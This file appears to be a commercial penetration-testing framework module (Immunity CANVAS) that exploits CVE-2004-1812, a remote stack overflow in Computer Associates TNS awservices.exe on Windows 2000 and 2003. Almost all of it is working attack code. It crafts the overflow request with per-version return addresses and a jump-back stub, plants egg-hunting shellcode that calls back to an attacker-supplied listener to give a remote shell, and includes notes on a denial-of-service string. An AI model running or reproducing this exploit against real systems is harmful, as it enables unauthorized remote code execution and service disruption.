#! /usr/bin/env python


"""

awservices.py for TNS 2.4 (Computer Associates)

"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")
sys.path.append("../../MOSDEF")
sys.path.append("./MOSDEF")

      
import os,getopt
import socket
from exploitutils import *
import addencoder
import win32shell
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time
import mosdef

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Computer Associates"
DOCUMENTATION["Notes"]="Remote exploit against awservices.exe - part of TNS 2.4 according to tnsver.exe"
DOCUMENTATION[".exe"]="awservices.exe"
DOCUMENTATION["Fixed by"]="TNS Patch T3592544"
DOCUMENTATION["Fixed date"]="03/02/2004"
DOCUMENTATION["CVE Name"] = "CVE-2004-1812"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1812"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"]="http://marc.info/?l=bugtraq&m=107936784030214&w=2"


DESCRIPTION="awservices.exe stack overflow"
VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000", "2003" ]

NAME="awservices.exe"

NOTES="""

DoS 1 (null ptr deref):
    teststring="%16s"%1
    teststring+="A"
    self.log("Sending: %s"%teststring)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2=s2._sock
    s2.connect((self.host, self.port))
    s2.send(teststring)
    
    
    Actually, any bad string will cause a DoS There are also some bugs where it
    looks like you can call install, remove, etc without authentication. This
    overflow was easier though. 004030fc == sprintf() onto the stack of our
    string!
    
    awservices start and awservices stop will restart the service if necessary...

    After the patch, the shellcode seems a bit unstable. Need to see what I can do
    about that.
    
    Apparantly this issue used to exist on TNS 2.5 but they patched it.
    
"""

CHANGELOG="""

"""



runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

    

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name=NAME
        self.port=9990
        self.host=""
        self.shellcode="\xcc" * 298
        #hmm, according to 60074207 we only compare with 0, 0d 0a 3f 26 20
        #self.searchbadstring="%.,:;\x00\x0a\x0d+\"\x2f\x5c\x09\x0e\x0b =&~("
        self.searchbadstring="\x00`'\":{} "
        self.badstring=self.searchbadstring
        self.ssl=0
        self.setVersions()
        self.version=1
        #we use a special tag1 here since we want to avoid any instances of our
        #string that get tolowered...
        self.tag1="\xebA\xebB"

        return

    def setVersions(self):
        self.versions={}
        #Name, pop pop return (in awscomm), 
        #tested on win2K3 and Windows 2000!
        self.versions[1]=("awservices.exe",0x10010641,290,20)
        self.versions[2]=("awservices.exe (QO12202 installed)",0x10013387,290,20)
        self.versions[3]=("crash it",0x01020304,290,20)

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        localhost=self.callback.ip
        localport=self.callback.port
        if self.version==0:
            self.localhost=localhost
            self.localport=localport
            return "No need to create shellcode yet"

        self.log("Creating shellcode for version %s"%self.version)
        self.log("Calling back to %s:%s"%(localhost,localport))

        self.createWin32SearchShellcode(localhost,localport)

        self.log("length of real shellcode: %d"%(len(self.shellcode)))

        return self.shellcode

    
    def test(self):
        """
        for now, we just test the port to see if it is open
        """
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        #s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2=self.gettcpsock()
        try:
            s2.connect((self.host, self.port))
            s2.close()
            self.setVersion(1)
        except:
            return 0
        return 1
    
    def putshellcode(self):
        
        #this EGQE is fed into strtok
        #arg - strings get passed through tolower?
        request="{{`A`,`D`,`E`},1,{{`A`,`a`},`A`,`a`,1,`A`,`a`,`A`,({`a`,`a`}),"
        request+=",({`A`,`a`,1})},2,`a`,3,1,1,1,1,"+self.shellcode+"}"
        sploitstring="%15s "%(len(request))
        sploitstring+=request
        #s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2=self.gettcpsock()
        try:
            s2.connect((self.host, self.port))
        except:
            self.log("Could not connect")
            return 0 
        self.log("Connected")
        s2.send(sploitstring)
        try:
            data=s2.recv(500)
        except:
            self.log("Couldn't receive data...")
            s2.close()
            return 0
        self.log("Returned: %s"%prettyprint(data))
        s2.close()
        return 1
    
    def run(self):
        """
        Send the overflow
        """
        self.host=self.target.interface
        self.port=self.argsDict.get("port",self.port)
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        self.log(NAME+" attacking %s:%d"%(self.host,self.port))
        if self.version==0:
            if not self.test():
                self.log("Could not connect or determine version")
                self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))
                return 0
            else:
                self.createShellcode(self.localhost,self.localport)
        try:
            self.putshellcode()
        except:
            self.log("Could not put shellcode...")
            #return 0 #should we exit now?
        self.log("Attempting to do exploit now...")
        sploitstring=self.makesploit()
        #s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2=self.gettcpsock()
        try:
            s2.connect((self.host, self.port))
        except:
            self.log("Couldn't connect...")
            self.setInfo("%s attacking %s:%d (failed)"%(NAME,self.host,self.port))
            return 0
        self.websend(s2,sploitstring)
        canvasengine.socket_save_list.append(s2)
        time.sleep(1)
        if self.ISucceeded():
            self.log("Exploit succeeded!")
            self.setInfo("%s attacking %s:%d (succeeded!)"%(NAME,self.host,self.port))
            return 1
        else:
            self.log("Exploit failed.")
            self.setInfo("%s attacking %s:%d (failed)"%(NAME,self.host,self.port))
            return 0
    
        
    def makesploit(self):
        """
        Construct the attack
        """
        EIP=intel_order(self.versions[self.version][1])
        EIPLOC=self.versions[self.version][2]
        SHELLOC=self.versions[self.version][3]
        jmpnum=SHELLOC-(EIPLOC+4+8) #calculate how far back we have to jmp
        #is this going to cause problems with Python 2.4?
        jmpbackcode="jmp $0x%8.8x"%uint32(jmpnum)
        jmpback=mosdef.assemble(jmpbackcode,"X86")
        print "jmpback: %s"%hexprint(jmpback)

        #controls the stack overflow
        attackstring="A"*0x3ff
        attackstring=stroverwrite(attackstring,self.encodedsearchcode,20)
        attackstring=stroverwrite(attackstring,"\xeb\x04",EIPLOC-2)
        attackstring=stroverwrite(attackstring,EIP,EIPLOC)
        attackstring=stroverwrite(attackstring,jmpback,EIPLOC+4)
        
        #{{S,S,S},I,{{S,S},S,S,I,S,S,S,({S,S}),B,({S,S,I})},I,S,I,B,B,B,B,B}
        request="{{`A`,`DEFG`,`EGQE`},2,{{`A`,`"+attackstring+"`},`A`,`A`,4,`A`,`a`,`A`,({`a`,`a`}),1,({`A`,`a`,4})},2,`a`,3,1,1,1,1,1}"

        #there is some really buggy code in the program that does an atoi on the first 16 bytes you send it
        #however, they don't null terminate your string, so you end up atoiing <your string><some random pointer>
        #which is crazy and so we have to work around it by only using 15 bytes and adding a space
        sploitstring="%15s "%(len(request))
        sploitstring+=request
        #self.log("Sending: %s"%sploitstring)

        return sploitstring

def usage():
    print "Usage: "+sys.argv[0]+" -t target [-p port:2381] [-v version:1] -l localip -d localport "
    app=theexploit()
    app.displayVersions()


if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
